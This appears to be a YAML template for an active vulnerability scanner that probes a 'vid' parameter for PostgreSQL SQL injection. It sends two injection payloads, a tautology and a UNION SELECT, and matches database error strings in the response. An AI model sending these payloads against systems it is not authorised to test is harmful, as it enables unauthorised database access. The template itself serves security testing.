id: sqli3-pg-03
name: 'SQLi pg prefix #2 in vid'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via vid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      vid:
        - '''))) OR (((''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
